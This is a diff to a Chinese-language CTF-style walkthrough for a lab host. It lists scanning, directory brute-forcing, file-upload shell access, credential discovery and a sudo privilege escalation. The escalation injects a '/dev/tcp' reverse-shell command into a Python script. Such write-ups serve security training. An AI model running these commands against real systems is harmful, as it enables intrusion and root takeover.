@@ -14,7 +14,7 @@ tags:
 
 扫描所执行的命令，执行结果如下
 
-```
+```bash
 sudo nmap -sn 10.10.10.0/24
 
 sudo nmap --min-rate 10000 -p- 10.10.10.31   
@@ -30,7 +30,7 @@ sudo nmap --script=vuln -p22,80 10.10.10.31
 
 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
 
-```
+```bash
 sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
 ```
 
@@ -50,7 +50,7 @@ dashborard 界面像是一个文件上次的界面，可能存在 **文件上传
 
 ajax.bak 是备份文件，curl 下载看看
 
-```
+```bash
 curl http://10.10.10.31/ajax.php.bak
 ```
 
@@ -91,7 +91,7 @@ curl http://10.10.10.31/ajax.php.bak
 
 上传成功，用更大的字典目录爆破以下查找上传到的文件夹
 
-```
+```bash
 sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ```
 
@@ -107,7 +107,7 @@ nc 监听启动 shell
 
 切换更好的 bash 交互界面
 
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash");'
 ```
 
@@ -115,7 +115,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash");'
 
 passwd 有可读权限，查看拥有 bash 环境的用户
 
-```
+```bash
 ls -liah /etc/passwd
 
 cat /etc/passwd | grep "/bin/bash"
@@ -123,7 +123,7 @@ cat /etc/passwd | grep "/bin/bash"
 
 ![P17](P17.png)
 
-```
+```bash
 cd ../../../../../home/athena
 
 ls
@@ -137,7 +137,7 @@ cat password-reminder.txt
 
 拿到密码，切换用户，查看 sudo -l 权限
 
-```
+```bash
 su athena
 
 myvulnerableapp*
@@ -149,7 +149,7 @@ sudo -l
 
 可以免 root 使用 python3 执行 cookie-gen.py，查看 cookie-gen.py 文件
 
-```
+```bash
 ls -liah /home/team-tasks/cookie-gen.py
 
 cat /home/team-tasks/cookie-gen.py
@@ -159,7 +159,7 @@ cat /home/team-tasks/cookie-gen.py
 
 审计源码 发现可以拼接字符串执行命令
 
-```
+```bash
 sudo python3 /home/team-tasks/cookie-gen.py
 
 aaa&bash -c 'bash -i >& /dev/tcp/10.10.10.5/2348 0>&1'
